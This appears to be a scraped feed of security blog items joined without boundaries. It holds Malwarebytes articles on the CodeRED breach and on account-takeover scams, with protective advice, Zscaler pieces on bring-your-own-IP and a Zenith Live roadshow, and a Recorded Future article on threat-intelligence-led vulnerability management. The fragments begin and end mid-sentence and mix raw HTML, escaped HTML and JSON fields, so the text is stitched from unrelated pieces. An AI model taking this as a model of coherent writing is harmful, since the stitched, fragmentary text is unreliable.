href=\"https://www.denver7.com/news/local-news/law-enforcement-agencies-reevaluate-contracts-with-codered-after-data-breach\" rel=\"noopener\" target=\"_blank\">terminated</a> their CodeRED contracts following the outage.</p>\n<h2><strong>Why this matters</strong></h2>\n<p>Cyberattacks happen, and data breaches are not always preventable. But storing your subscriber database\u2014including passwords in clear text\u2014seems rather careless. Providers should assume people reuse passwords, especially for accounts they don\u2019t view as very sensitive.</p>\n<p>Not that ransomware groups care, of course, but systems like CodeRED genuinely saves lives. When that system goes down or cannot be trusted, communities may miss evacuation orders, severe weather warnings, or active-shooter alerts when minutes matter.</p>\n<p>Users are now being told to change their passwords, sometimes across multiple websites. But has everyone been notified? And even if they have, will they actually take action?</p>\n<h2>Protecting yourself after a data breach</h2>\n<p>If you think you have been the&nbsp;<a href=\"https://www.malwarebytes.com/blog/personal/2023/09/involved-in-a-data-breach-heres-what-you-need-to-know\" rel=\"noopener\" target=\"_blank\">victim of a data breach</a>, here are steps you can take to protect yourself:</p>\n<ul>\n<li><strong>Check the vendor\u2019s advice.</strong>&nbsp;Every breach is different, so check with the vendor to find out what\u2019s happened and follow any specific advice it offers.</li>\n<li><strong>Change your password.</strong>&nbsp;You can make a stolen password useless to thieves by changing it. Choose a&nbsp;<a href=\"https://www.malwarebytes.com/computer/how-to-create-a-strong-password\" rel=\"noopener\" target=\"_blank\">strong password</a>&nbsp;that you don\u2019t use for anything else. Better yet, let a&nbsp;<a href=\"https://www.malwarebytes.com/what-is-password-manager\" rel=\"noopener\" target=\"_blank\">password manager</a>&nbsp;choose one for you.</li>\n<li><strong>Enable&nbsp;<a href=\"https://www.malwarebytes.com/blog/news/2023/10/multi-factor-authentication-has-proven-it-works-so-what-are-we-waiting-for\" rel=\"noopener\" target=\"_blank\">two-factor authentication&nbsp;(</a><a href=\"https://www.malwarebytes.com/cybersecurity/basics/2fa\" rel=\"noopener\" target=\"_blank\">2FA</a></strong><strong>).</strong>&nbsp;If you can, use a FIDO2-compliant hardware key, laptop, or phone as your second factor. Some forms of 2FA&nbsp;can be phished just as easily as a password, but 2FA that relies on a FIDO2 device can\u2019t be phished.</li>\n<li><strong>Watch out for impersonators.</strong>&nbsp;The thieves may contact you posing as the breached platform. Check the official website to see if it\u2019s contacting victims and verify the&nbsp;identity of anyone who contacts you&nbsp;using a different communication channel.</li>\n<li><strong>Take your time.</strong>&nbsp;Phishing attacks often impersonate people or brands you know, and use themes that require urgent attention, such as missed deliveries, account suspensions, and security alerts.</li>\n<li><strong>Consider not storing your card details</strong>. It\u2019s definitely more convenient to let sites remember your card details, but we highly recommend not storing that information on websites.</li>\n<li><strong>Set up&nbsp;<a href=\"https://www.malwarebytes.com/cybersecurity/basics/dark-web-monitoring\" rel=\"noopener\" target=\"_blank\">identity monitoring</a></strong>, which alerts you if your&nbsp;<a href=\"https://www.malwarebytes.com/cybersecurity/basics/pii\" rel=\"noopener\" target=\"_blank\">personal information</a>&nbsp;is found being traded illegally online and helps you recover after.</li>\n</ul>\n<p><strong>We don\u2019t just report on threats\u2014we help safeguard your entire digital identity</strong></p>\n<p>Cybersecurity risks should never spread beyond a headline.

      "link": "https://www.zscaler.com/blogs/product-insights/announcing-ability-bring-your-own-dedicated-ip-byoip-zscaler-zero-trust",
      "summary": "As organizations accelerate Zero Trust adoption, one consistent request from network architects, CISOs, and compliance teams is the ability to egress the internet using deterministic, dedicated IP addresses tied specifically to their organization. While Zscaler has been providing&nbsp;dedicated IPs to organizations for a very long time, our customers have expressed interest to bring their own IPs to support certain legacy workflows, regulatory environments, and partner systems that still require static, predictable and customer-owned egress IPs.Zscaler supports both Zscaler-assigned Dedicated IPs and customer-owned Dedicated IPs (Bring Your Own IP aka BYOIP) giving enterprises maximum flexibility while preserving the benefits of a modern Zero Trust architecture.What is a Dedicated IP address?A dedicated IP address is a unique IP (Internet Protocol) address that is permanently allocated to a single organization ensuring it is exclusively available for their use. Although not a Zero Trust method due to poor authentication, complexity and vulnerability to compromise, allowlisting access to resources based on source IP address remains a tool in use by legacy SaaS platforms or partner networks. Zscaler offers multiple solutions to address this problem that are covered in this&nbsp;White Paper.&nbsp;Why Dedicated IPs Still Matter, Even in a Zero Trust WorldMany customers continue to operate systems that rely on fixed public IP identity. Dedicated IPs help address:1. Deterministic Identity for Downstream ControlsSome SaaS platforms, partner networks, or regulatory gates still depend on allowlisting IP addresses for access control. Dedicated IPs ensure predictable egress identity without impacting Zero Trust posture.2. Clear Lines of Ownership, Logging, and AuditabilityCustomer-owned IP ranges create clean attribution boundaries for compliance, logging, and forensics.3. Operational Stability Across MigrationsDedicated IPs maintain consistent external identity even as internal architectures modernize or move away from on-prem or hyperscaler environments.4. Regulatory and Sovereignty RequirementsBYOIP enables organizations to keep ownership of their IP ranges while leveraging Zscaler\u2019s global cloud footprint.What BYOIP on Zscaler looks likeYou bring an IPv4 prefix you own, Zscaler securely validates your authorization to use our ASN to originate it, then Zscaler advertises the route from the designated region and makes the IPs available as Zscaler Managed Dedicated IPs for policy and egress. You can be assigned as many Dedicated IPs as you are entitled to. The validation hinges on two pillars:ROA: A cryptographically signed object in your Regional Internet Registry (RIR) that authorizes a specific Autonomous System Number (ASN) to originate your route.A customer-signed BYOIP message: A short, signed statement tying your prefix to your organization that Zscaler verifies against public materials you publish in your RIR records.Supported regions and ASNsAPAC: AS53813Americas: AS22616EMEA: AS62044PrerequisitesYour prefix is registered with your RIR (ARIN, APNIC, RIPE).IPv4 is supported today (minimum size /24 from a single Zscaler DC). IPv6 minimum is /48 for future support planning; check with your Zscaler representative for timelines.Create a ROA in your RIR that includes your prefix and the appropriate Zscaler ASN for the region where you want the BYOIP deployed.Prepare an x.509 self-signed certificate pair (public and private) to sign your BYOIP validation message.Security and assurance under the hoodROA and RPKI validation: The industry-standard framework ensures route origination integrity. Zscaler\u2019s routing system checks your ROA status before advertisement.Cryptographic attestation: Your x.509-backed signed message lets us confirm the request aligns with your RIR-published materials, thwarting spoofing or misrepresentation.Regional scoping: By tying ROA to a specific Zscaler ASN per region, you control where your prefixes are surfaced, aligning with data residency or performance requirements.Operational safeguards: Zscaler enforces change controls and automated checks before announcements, and monitors propagation and reachability once live.Technical FAQsWhat happens if the ROA expires? Zscaler monitors ROA validity. If the ROA lapses, announcements may be withdrawn to maintain routing hygiene; plan renewals ahead of time.&nbsp; It is critical to ensure timely renewal to avoid service disruptionx.Can I move a prefix between regions? Yes, but you must update the ROA to authorize the new regional ASN and coordinate via support to ensure seamless transitions.IPv6 support? Minimum /48 applies. Check with your Zscaler team for current availability timelines.How is logging handled? Traffic egressing via Dedicated IP is visible in Zscaler logs and analytics as usual, with your owned ranges aiding correlation and downstream controls.Key definitionsROA: A cryptographically signed object that specifies which ASN is authorized to originate a given route.RIR: Regional Internet Registry (ARIN, RIPE, APNIC) governing allocations of IP addresses and ASNs.X.509: A standard for digital certificates used to verify entities in online communications.Getting startedIf you already own eligible prefixes and have RIR access, you can begin today by creating your ROA, publishing your public certificate in your netblock remarks, preparing and signing the BYOIP message, and opening a support ticket. If you prefer white-glove onboarding, contact your Zscaler representative to coordinate the process and timelines.With customer-owned Dedicated IPs, the Zero Trust Exchange becomes not only the fastest path to secure access, but also the most predictable and compliant way to represent your organization on the internet.",

It affects everything from email and social media to retailer, travel, and banking accounts. Criminals use plenty of tactics,  including malware on your computer or phone, or \u201ccredential stuffing,\u201d where they try compromised passwords across lots of sites.</p>\n<p>The FBI\u2019s new alert focuses on attackers who impersonate customer support or tech support from your bank. Amazon\u2019s warning describes almost identical techniques, but aimed at Amazon shoppers instead of banking customers.</p>\n<p>Attackers send texts, emails and make phone calls designed to fool you into giving away your username and password, and even your multi-factor authentication (MFA) codes. Once they\u2019re in the account, scammers quickly reset passwords or other access controls, locking you out of your own account.</p>\n<h3><strong>Fake websites, fake alerts, and fake customer support</strong></h3>\n<p>The FBI highlights another technique used for similar purposes: website-based phishing. The scammer will direct you to a fake site that looks just like your bank\u2019s login page. The moment you enter your details, the criminals steal them and use them on the real banking site.</p>\n<p>Amazon says the same thing is happening to its customers. In a warning email sent November 24, it listed the attacks it is seeing most often:</p>\n<ul>\n<li>Fake delivery notices or account-issue messages</li>\n<li>Third-party ads offering unbelievable deals</li>\n<li>Messages via unofficial channels requesting login or payment information</li>\n<li>Links to look-alike websites</li>\n<li>Unsolicited \u201cAmazon support\u201d phone calls</li>\n</ul>\n<p>One of the FBI\u2019s examples mirrors this almost exactly: Attackers claim there has been fraudulent activity on your account and urge you to click a link to \u201cfix\u201d it, but it sends you straight to a phishing site.</p>\n<h3>How do the scammers get you to these sites?</h3>\n<p>Search engine optimization (SEO) poisoning is one common technique, the FBI says. Scammers buy ads with search engines that direct users to their malicious sites. Many mimic household names with tiny variations that are easy to miss when you\u2019re in a hurry.</p>\n<p>Amazon\u2019s warning is backed up by research from FortiGuard Labs, which found that 19,000+ new domains set up to imitate major retail brands. 2,900 of those were proven to be malicious. </p>\n<p>This wave of impersonation attacks isn\u2019t limited to search ads and look-alike domains. Researchers have also uncovered a system called <a href=\"https://www.malwarebytes.com/blog/news/2025/11/matrix-push-c2-abuses-browser-notifications-to-deliver-phishing-and-malware\" rel=\"noopener\" target=\"_blank\">Matrix Push C2</a> that abuses browser push notifications to deliver fake alerts designed to look like they\u2019re from trusted brands such as Netflix, PayPal, and Cloudflare. Once clicked, those alerts lead victims to phishing pages or malware, giving attackers yet another path to steal login details or take over accounts.</p>\n<h2>A growing epidemic</h2>\n<p>This type of fraud is on the rise. <a href=\"https://newsroom.transunion.com/h2-2025-global-fraud-report/\" rel=\"noopener\" target=\"_blank\">According to TransUnion</a>, digital account takeover climbed 21% from H1 2024 to H1 2025, and 141% since H1 2021. It\u2019s big business; the FBI has received over 5,100 complaints since January, and says that losses have hit $262 million.</p>\n<p>This is a <a href=\"https://www.malwarebytes.com/blog/news/2025/11/holiday-scams-2025-these-common-shopping-habits-make-you-the-easiest-target\" rel=\"noopener\" target=\"_blank\">popular time for scammers</a> to ramp up ATO fraud. Amazon\u2019s alert comes at one of the busiest online shopping periods of the year\u2014Black Friday and the run-up to the holidays. </p>\n<p>And while MFA is important, it doesn\u2019t always save you. Proofpoint <a href=\"https://www.proofpoint.com/us/blog/email-and-cloud-threats/detecting-responding-stopping-account-takover\" rel=\"noopener\" target=\"_blank\">found</a> that 65% of compromised accounts had MFA enabled. But if you give up your secrets to a scammer, they have the keys to the kingdom.</p>\n<p>Passwordless options such as passkeys promise better security because then there\u2019s no MFA code to give up (you just use biometric access or click on a browser prompt to log in). However, those are still relatively uncommon compared to passwords, and when they do exist, people don\u2019t often use them.</p>\n<h2>How to protect yourself</h2>\n<p>Cybercriminals prey on the vulnerable and the distracted. Brand impersonation works because attackers lean hard on urgency. They claim your account has been breached, or a large transaction has gone through, or a delivery can\u2019t be completed.</p>\n<p>Scammers are experts at using fear to get past your emotional defenses. In one inventive twist highlighted by the FBI, scammers told victims their details were used for firearms purchases, then transferred them to a fake \u201claw enforcement\u201d accomplice. Once fear kicks in, people act fast.</p>\n<p>Whether the scammer is posing as Amazon, your bank, or a courier service, the same rules apply:</p>\n<ul>\n<li><strong>Bookmark your bank and retailer login pages.</strong> Don\u2019t search for them, as results can be spoofed.</li>\n<li><strong>Use official apps.</strong> Download your bank or Amazon app directly from an official link, not through a search engine.</li>\n<li><strong>Be stingy with personal info.</strong> Pet names, schools, and birthdays can help criminals with \u201csecurity questions.\u201d</li>\n<li><strong>Be skeptical of caller ID.</strong> It can be spoofed. Hang up, then call back using a verified number.</li>\n<li><strong>Use passkeys if offered.</strong> They cut out SMS codes entirely and help prevent phishing.</li>\n<li><strong>Never share one-time codes.</strong> No legitimate company will ask.</li>\n</ul>\n<p>Amazon also reminds users:</p>\n<ul>\n<li>It will <strong>never</strong> ask for payment information over the phone.</li>\n<li>It will <strong>never</strong> send emails asking customers to verify login details.</li>\n<li>All account changes, tracking, and refunds should go through the Amazon app or website only.</li>\n</ul>\n<p>If you do think you\u2019ve been hit by an ATO scam, contact your bank immediately to try and recall or reverse any fraudulent transactions. It might still not be too late, but every second counts. Also, <a href=\"https://www.ic3.gov/PSA/2025/PSA251125\" rel=\"noopener\" target=\"_blank\">file a complaint</a> with the FBI\u2019s IC3 online crime unit.</p>\n<p><strong>We don\u2019t just report on scams\u2014we help detect them</strong></p>\n<p>Cybersecurity risks should never spread beyond a headline.

      "summary": "Organizations face unprecedented pressure to push their technological boundaries as AI adoption accelerates and competition intensifies. However, the current pace of AI integration far outstrips the speed in which organizations normally assess and address the risks. As a result, the race between innovation, speed and security is leaving defenders in an increasingly vulnerable position.&nbsp;IT security practitioners must enable this new technology\u2019s use - whether public tools or internal deployments - while establishing reasonable guardrails that ensure visibility and robust data security assessments. Organizations are urgently seeking best practices to navigate AI-driven transformation. Extending Zero Trust principles to regain visibility and control of all data streams is now more critical than ever.As companies rethink how employees safely consume generative or agentic applications, they must also apply Zero Trust to their broader ecosystem of suppliers, partners, and B2B integrations. Modern supply chains increasingly share data, applications, and now AI models - creating a new attack surface if not properly secured.That\u2019s why Zscaler\u2019s Zenith Live event series is returning in its one-day roadshow format across Europe - turning AI insights into action. The events will showcase how a cloud-based approach to Zero Trust Everywhere can help security practitioners reduce risk, complexity, and cost in the new technology era. Zscaler experts will reveal how AI and Zero Trust are converging to redefine networking and security, fuelling rapid digital transformation and building resilient, mission-critical infrastructures to safeguard today's business aspirations.&nbsp;Participants will discover how a cloud-centric Zero Trust approach is redefining security to protect every connection, from users and workloads to IoT, OT, branches, and even AI. Security practitioners, IT architects, or networking professionals will gain practical insights and tools to drive real transformation, learning from their peers how to reset boundaries&nbsp; in the pursuit of digitalization while carefully managing cybersecurity risks. Zscaler experts will be on hand to share the latest strategies to minimize attack surfaces, eliminate lateral movement and prevent data loss.&nbsp;Following the recent SPLX acquisition, attendees will get first-hand insights at how this addition to the Zero Trust Exchange platform will extend shift-left AI asset discovery, automated red teaming, and governance - helping organizations secure their AI investments from development through deployment. We\u2019re also bringing back industry panels and fireside chats, offering attendees the opportunity to learn from industry leaders and network with their peers.Agentic AI \u2013 Friend or Foe?As part of the agenda, we will also be speaking with Zscaler customers at different stages of their Zero Trust transformation journey. Panellists from leading private and public organizations will share their learnings in a \u2018fireside chat\u2019 - helping others who wish to take that first step towards a Zero Trust architecture. Having overcome their own implementation challenges, they\u2019ll offer insights and guidance to make Zero Trust a reality.&nbsp;New this year: a panel on the emergence, adoption and security of Agentic AI. Zeki Turedi, Field CTO at Crowdstrike, and Rob Hale, Principal Security Segment Leader at AWS, will debate whether Agentic AI is a friend or foe - and underline the importance of retaining control over critical digital infrastructure, redefining data governance, and unlocking innovation securely.To learn more about the Zenith Live Encore agenda in your city and discover how Zscaler secures data, applications, devices and users on organizations\u2019 transformation journeys, visit the&nbsp;registration site.

Dozens of new CVEs are disclosed daily, spanning a wide diversity of technologies\u2014&lt;a href=\"https://www.cve.org/about/Metrics\" rel=\"noreferrer\" target=\"_blank\"&gt;over 40,000 were published in 2024 alone&lt;/a&gt;. Without strong organization, prioritization, and visibility, this flood of vulnerabilities can overwhelm remediation teams and leave truly dangerous gaps unaddressed. Teams need a way to separate noise from risk and focus effort where it counts. Without comprehensive visibility and well-defined workflows, organizations have no way of knowing which vulnerabilities matter most, and remediation stalls.&lt;/p&gt;\n    &lt;p&gt;Risk-based prioritization\u2014especially when grounded in threat context\u2014keeps patching aligned with real-world attacker activity and an organization\u2019s most critical assets. This is where threat intelligence changes the game. By adding insight on active exploits, attacker interest, and malware associations to vulnerability data, teams can identify which issues are actively being targeted and prioritize those first. The result is a modern, intelligence-driven approach to vulnerability management that bridges the gap between endless vulnerability lists and actual risk reduction.&lt;/p&gt;\n    &lt;h2&gt;Understanding Threat Intelligence and Vulnerability Management&lt;/h2&gt;\n    &lt;p&gt;Before organizations can modernize their approach to vulnerability management, it\u2019s important to understand the two core disciplines involved, and the limitations that emerge when they operate independently. Threat intelligence and vulnerability management are both essential to reducing cyber risk, but too often weak integration keeps teams from acting on intelligence to actually get ahead of critical vulnerabilities. To appreciate the value of integrating threat intelligence with vulnerability management, let\u2019s define each discipline and their traditional limitations:&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;Threat Intelligence: Threat intelligence refers to curated information about malicious actors, their tactics, and emerging attacks that helps defenders make informed decisions. Threat Intelligence encompasses data on indicators of compromise, adversary techniques, and observed exploits in the wild. The goal is to understand the current threat landscape and anticipate how attackers might strike next.&lt;/li&gt;\n      &lt;li&gt;Vulnerability Management (VM): Vulnerability management is the process of systematically identifying, assessing, and remediating weaknesses (software bugs, misconfigurations, etc.) in an organization\u2019s systems. Traditional VM programs rely on network scanners and inventory databases to discover vulnerabilities, assign severity scores (e.g. CVSS), and then patch or mitigate the issues based on priority. The standard VM cycle involves scanning for known CVEs, producing a list of findings, fixing what you can, and then rescanning to verify fixes.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;h3&gt;The Limitations of Siloed Approaches&lt;/h3&gt;\n    &lt;p&gt;Performed in silos, a major gap exists between finding vulnerabilities and actually reducing risk. VM tools excel at detecting thousands of issues, but without threat context they can\u2019t tell which of those hundreds of critical CVEs truly pose a real risk to your organization. This often leads teams to fix issues based purely on CVSS severity or ease of patching\u2014a numbers-driven approach that may leave actively exploited vulnerabilities unpatched. Meanwhile, threat intelligence teams might be tracking dangerous new exploits or adversary campaigns, but if that intel isn\u2019t linked to the VM process, it never informs patch prioritization. The two teams operate on parallel tracks, missing the synergy needed to combat real threats.&lt;/p&gt;\n    &lt;p&gt;Without integrating threat intelligence and VM, there\u2019s &lt;a href=\"https://www.recordedfuture.com/blog/closing-vulnerability-gaps\" rel=\"noreferrer\" target=\"_blank\"&gt;a dangerous disconnect&lt;/a&gt;\u2014critical vulnerabilities may linger unaddressed because the VM team lacks insight into real-world threat activity, and threat intel may be under-leveraged without an established path to inform remediation efforts.&lt;/p&gt;\n    &lt;h2&gt;Challenges of Traditional Vulnerability Management&lt;/h2&gt;\n    &lt;p&gt;Even the most well-resourced teams struggle to keep pace with today\u2019s vulnerability landscape. The sheer volume of findings, the limited context available, and the pressure to act quickly all create structural weaknesses in traditional VM programs. Key issues include:&lt;/p&gt;\n    &lt;h3&gt;An Overwhelming Volume of CVEs&lt;/h3&gt;\n    &lt;p&gt;Modern organizations face an avalanche of vulnerabilities. Each vulnerability scan can return hundreds or thousands of findings, and new CVEs are disclosed at a record pace every year. This sheer volume makes it impractical for teams to patch everything, but without further guidance, many vulnerability managers feel pressure to fix as much as possible and use raw counts of patched bugs as a success metric. The result is often firefighting and fatigue. Additionally, using volume-based metrics rather than those tied to impact reduces the credibility of your VM program.&lt;/p&gt;\n    &lt;h3&gt;Lack of Real-World Threat Context&lt;/h3&gt;\n    &lt;p&gt;Traditional VM programs typically prioritize based on static severity scores (CVSS) or vendor guidance, which show how critical a vulnerability would be if exploited, but do not reflect whether attackers are actively targeting it. A flaw might be rated 9.8 \u201ccritical\u201d on CVSS, but if no threat actors are targeting it, it poses less immediate risk than a 7.0 \u201chigh\u201d that\u2019s being widely exploited in the wild. Without &lt;a href=\"https://www.recordedfuture.com/products/threat-intelligence\" rel=\"noreferrer\" target=\"_blank\"&gt;threat intelligence&lt;/a&gt;, vulnerability managers lack insight into which vulnerabilities are featured in exploit kits, mentioned on dark web forums, or being leveraged in recent breaches.&lt;/p&gt;\n    &lt;h3&gt;Resource Constraints in Remediation Teams&lt;/h3&gt;\n    &lt;p&gt;Most security and IT teams simply don\u2019t have enough personnel or downtime to remediate every vulnerability promptly. Legacy vulnerability management often operates on a reactive model\u2014scan, list, and attempt to patch\u2014which can overwhelm teams. They must triage an endless queue of patches, schedule maintenance windows, and avoid disrupting critical systems. With limited staff, it\u2019s common for patch backlogs to grow.&lt;/p&gt;\n    &lt;h3&gt;Reactive vs. Proactive Posture&lt;/h3&gt;\n    &lt;p&gt;Reactive approaches are driven by periodic scan reports or the latest security bulletin. Organizations may only discover a need to patch when the scanner flags a new CVE\u2014or worse, when an incident responder finds that attackers exploited a missing patch. In fact, threat actors are getting faster at exploiting new flaws\u2014it often takes only around &lt;a href=\"https://www.recordedfuture.com/blog/closing-vulnerability-gaps\" rel=\"noreferrer\" target=\"_blank\"&gt;15 days&lt;/a&gt; for an exploit to appear in the wild once a vulnerability is disclosed \ufffc. This means a purely reactive patch cycle leaves a dangerous exposure window. The key challenge is shifting out of react mode and into a more proactive, &lt;a href=\"https://www.recordedfuture.com/blog/enhancing-vulnerability-management\" rel=\"noreferrer\" target=\"_blank\"&gt;intelligence-informed strategy&lt;/a&gt; that addresses likely threats before they strike,ultimately helping to close those vulnerability gaps.&lt;/p&gt;\n    &lt;h2&gt;How Threat Intelligence Strengthens Vulnerability Management&lt;/h2&gt;\n    &lt;p&gt;Threat intelligence adds a critical dimension that traditional VM tools simply can\u2019t provide: a real-time view of attacker behavior. This context transforms raw vulnerability data into something actionable, allowing teams to focus their attention on the issues that genuinely matter. By weaving threat intelligence into the VM lifecycle, organizations can meaningfully elevate their defenses.&lt;/p&gt;\n    &lt;p&gt;By incorporating threat intelligence, vulnerability management teams gain up-to-the-minute awareness of which vulnerabilities are being actively exploited or discussed by attackers. Knowing that a given CVE is being used to target your industry, leveraged in ransomware attacks, or scanned for by adversaries elevates its priority dramatically. Such context allows you to focus remediation on the vulnerabilities most likely to impact your organization\u2019s systems.&lt;/p&gt;\n    &lt;p&gt;Meanwhile, intelligence enables a shift from a purely severity-based approach to a risk-based vulnerability management strategy. Instead of treating all \u201ccritical\u201d CVEs as equal, teams combine internal asset criticality with external threat likelihood to calculate risk. By fusing threat intel (exploit availability, attacker interest, trending malware) with vulnerability data, organizations can remediate the vulnerabilities that pose the greatest real-world risk first, dramatically reducing the chances of breach.&lt;/p&gt;\n    &lt;p&gt;With better prioritization and context, security teams can respond faster to the vulnerabilities most dangerous to their specific organization. Threat intelligence acts as an early-warning system. It can alert you to a new critical CVE that\u2019s being weaponized in the wild days or weeks before official sources might highlight it. That lead time means patches or mitigations can be applied sooner, shrinking the window of exposure.&lt;/p&gt;\n    &lt;p&gt;Finally, threat intelligence helps translate the technical details of vulnerabilities into business impact terms, improving communication with leadership and other stakeholders. By understanding which vulnerabilities could actually disrupt the business, security teams can better convey urgency to management and get support for emergency patches or downtime. Integrating threat intelligence also fosters alignment between the threat intel analysts and the vulnerability management/IT teams. Ultimately, intelligence-driven VM ensures that vulnerability prioritization maps to &lt;a href=\"https://www.recordedfuture.com/blog/how-security-leaders-defend-their-attack-surface\" rel=\"noreferrer\" target=\"_blank\"&gt;the organization\u2019s highest risks&lt;/a&gt; and threat scenarios, rather than an abstract severity rating.&lt;/p&gt;\n    &lt;h2&gt;Benefits of an Integrated Cybersecurity Approach&lt;/h2&gt;\n    &lt;p&gt;Bringing threat intelligence and vulnerability management together doesn\u2019t just streamline workflows \u2014 it reshapes how organizations reduce risk. Integrated programs operate with clearer priorities, faster response times, and better alignment across teams. Understanding these benefits helps illustrate why more enterprises are shifting toward a unified strategy.&lt;/p&gt;\n    &lt;h3&gt;Focused Resource Allocation (Focus on What Matters)&lt;/h3&gt;\n    &lt;p&gt;An integrated approach ensures your team\u2019s limited time and effort are spent where it truly counts. Rather than patching vulnerabilities arbitrarily or in numeric order, you can concentrate on the subset that intelligence deems most dangerous. This better allocation of resources means important patches happen faster, and staff aren\u2019t burning cycles on low-risk items.&lt;/p&gt;\n    &lt;h3&gt;Proactive Risk Mitigation&lt;/h3&gt;\n    &lt;p&gt;Combining threat intelligence with vulnerability management transforms the program from reactive to proactive. You\u2019re not just responding to scanner reports or waiting for a breach to highlight a missed patch. You\u2019re actively watching threat trends and preemptively fortifying systems against likely attacks. This proactive risk mitigation can stop incidents before they occur.&lt;/p&gt;\n    &lt;h3&gt;Improved Reporting and Compliance&lt;/h3&gt;\n    &lt;p&gt;An intelligence-informed VM process provides richer data for reporting up to executives or auditors. Security leaders can demonstrate not just how many vulnerabilities we patched, but justify how the fixes implemented strategically reduce risk to critical assets and keep the organization ahead of active threats. Additionally, integrating threat intelligence can strengthen compliance posture by ensuring that high-risk vulnerabilities (which often map to regulatory red flags) are dealt with promptly, thereby addressing key requirements in standards like ISO 27001, NIST CSF, or industry-specific guidelines.&lt;/p&gt;\n    &lt;h3&gt;Cross-Team Collaboration&lt;/h3&gt;\n    &lt;p&gt;When threat intelligence and vulnerability management are integrated, it breaks down silos between the teams that discover threats and those that fix them. Intelligence analysts, incident responders, vulnerability managers, and IT operations start to work from a common playbook informed by shared data. Threat intel might flag a critical new exploit; the VM team then rapidly assesses exposure and deploys patches; IT ops coordinates any system impacts, all in a coordinated workflow.&lt;/p&gt;\n    &lt;h2&gt;Practical Steps for Integration&lt;/h2&gt;\n    &lt;p&gt;Integrating threat intelligence into your VM program doesn\u2019t require a complete overhaul. It\u2019s a series of deliberate, achievable improvements. The key is knowing where intelligence can enhance existing workflows and how to introduce automation without disrupting core processes. These actionable steps provide a roadmap for making that transition smoothly.&lt;/p&gt;\n    &lt;ol&gt;\n      &lt;li&gt;&lt;strong&gt;Map Existing Workflows:&lt;/strong&gt; Begin by documenting your current vulnerability management process and how information flows (or doesn\u2019t) between the VM team and threat intelligence team. Understand your scan schedule, patch management cycle, and how decisions are made. Similarly, map out how threat intelligence is collected and disseminated in your organization.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Integrate Threat Intelligence Feeds and Platforms:&lt;/strong&gt; Connect external threat intelligence sources into your vulnerability management tooling. This can be done through threat intelligence feeds integrated directly into your VM software.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Automate Prioritization with Risk Scoring:&lt;/strong&gt; Leverage automated risk scoring systems that combine vulnerability data with threat intelligence to rank vulnerabilities. Dynamic risk scores (such as Recorded Future\u2019s risk score, Microsoft\u2019s MSRC ratings, or community metrics like CISA\u2019s KEV and EPSS) can update continuously based on new intel. Set up your workflow so that newly discovered vulnerabilities are automatically scored for risk and use these scores to automatically reorder your patch queue.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Create Dashboards for Real-Time Monitoring:&lt;/strong&gt; Develop dashboards or reports that give a consolidated, real-time view of your organization\u2019s vulnerability risk landscape. These dashboards should blend vulnerability scanning results with threat intelligence indicators. Security operations center (SOC) analysts can monitor such a dashboard to catch critical intel updates. If a new exploit is detected for a CVE present in your network, it can be flagged immediately. Dashboards provide ongoing visibility and help both technical teams and executives understand the state of vulnerability risk at a glance.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Continuously Refine Based on Threat Trends:&lt;/strong&gt; Integration is not a one-and-done project. It requires &lt;a href=\"https://www.recordedfuture.com/blog/5-ways-take-vulnerability-management-program-next-level\" rel=\"noreferrer\" target=\"_blank\"&gt;continuous improvement&lt;/a&gt;. Establish a feedback loop where after each patch cycle or major threat event, the teams review what was learned. Did threat intelligence correctly predict which vulnerabilities were most important? Were there incidents that revealed a missed vulnerability despite available intel? Use these insights to adjust your processes. Threat trends evolve constantly, so your integrated program should adapt.&lt;/li&gt;\n    &lt;/ol&gt;\n    &lt;h2&gt;Recorded Future: Taking a Holistic Cybersecurity Approach&lt;/h2&gt;\n    &lt;p&gt;Recorded Future\u2019s Intelligence Platform is designed to bridge the gap between threat intelligence and vulnerability management, enabling a truly holistic approach to cyber risk reduction. With Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/products/vulnerability-intelligence\" rel=\"noreferrer\" target=\"_blank\"&gt;Vulnerability Intelligence&lt;/a&gt; module, organizations get real-time, contextual intelligence on vulnerabilities integrated directly into their workflows:&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;&lt;strong&gt;Real-Time Risk Scoring and Alerts:&lt;/strong&gt; Recorded Future provides a dynamic risk score for each emerging vulnerability, updated in real time based on factors like active exploit availability, mentions by threat actors, links to malware (e.g. ransomware), and underground chatter. Instead of relying solely on CVSS, security teams see a threat-informed risk rating that tells them which vulnerabilities require immediate action.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Actionable Context and Intelligence:&lt;/strong&gt; Each vulnerability entry in the platform comes enriched with context. Analysts can quickly see if a vulnerability has known ties to adversaries or malware, if there are references in dark web sources, or if a proof-of-concept exploit is circulating. Recorded Future\u2019s &lt;a href=\"https://www.recordedfuture.com/platform/intelligence-graph\" rel=\"noreferrer\" target=\"_blank\"&gt;Intelligence Graph\u24c7&lt;/a&gt; correlates data from across the open web, dark web, technical sources, and its own research to paint a full picture.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Integration with VM Tools and Workflows:&lt;/strong&gt; Recorded Future offers out-of-the-box integrations with popular solutions. This includes integrations with vulnerability management systems like Tenable and Qualys, IT service management platforms like ServiceNow, SIEMs like Splunk, and more. These integrations allow threat intelligence to seamlessly augment your current workflow so analysts don\u2019t have to swivel-chair between tools. Additionally, Recorded Future\u2019s flexible API and browser extension enable custom integrations, ensuring you can bring its intelligence into any unique system or process you use.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;p&gt;With these capabilities, Recorded Future helps organizations prioritize remediation with actionable intelligence, saving hours of manual research and significantly reducing the exposure window for high-risk vulnerabilities. Recorded Future empowers you to move from reactive vulnerability management to a threat-informed, efficient, and ultimately more effective program.&lt;/p&gt;\n    &lt;h2&gt;Best Practices for a Modern Program&lt;/h2&gt;\n    &lt;p&gt;Even with the right tools, success relies on following best practices that maximize the impact of an intelligence-driven vulnerability management program. Here are some best practices for a modern, integrated VM program:&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;&lt;strong&gt;Adopt Continuous Monitoring Over Periodic Scanning:&lt;/strong&gt; Rather than scanning for vulnerabilities once a month or quarter, shift to continuous or at least more frequent discovery. Threats evolve quickly, and new critical vulnerabilities can\u2019t wait for the next scheduled 